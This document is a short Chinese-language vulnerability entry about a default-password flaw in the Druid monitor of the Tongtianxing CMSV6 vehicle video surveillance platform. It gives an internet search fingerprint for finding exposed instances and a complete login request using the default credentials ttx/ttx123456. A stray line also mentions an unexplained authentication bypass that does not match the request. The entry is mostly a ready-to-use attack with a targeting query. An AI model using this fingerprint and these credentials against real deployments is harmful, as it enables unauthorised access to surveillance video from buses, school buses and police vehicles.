# 通天星CMSV6车载视频监控平台 druid存在默认口令漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台 druid存在默认口令漏洞。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/99EBhY1oQ-mjYZgI/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-754278.png)

# 四、漏洞复现
`;downloadLogger.action`绕过鉴权

```plain
POST /druid/submitLogin HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/plain, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 42
Connection: close
Cookie: JSESSIONID=4F7D8A071EAC19E6196D1775D84D2F8D

loginUsername=ttx&loginPassword=ttx123456.
```

![1711464615359-a39000d2-d25e-428f-8c8d-70b3f0cea36a.png](./img/99EBhY1oQ-mjYZgI/1711464615359-a39000d2-d25e-428f-8c8d-70b3f0cea36a-366787.png)

![1711464632801-68cfb113-488a-48b1-8233-3f588fd8d554.png](./img/99EBhY1oQ-mjYZgI/1711464632801-68cfb113-488a-48b1-8233-3f588fd8d554-615129.png)



> 更新: 2024-12-28 13:05:36  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/agnzkrfsf9am4t8p>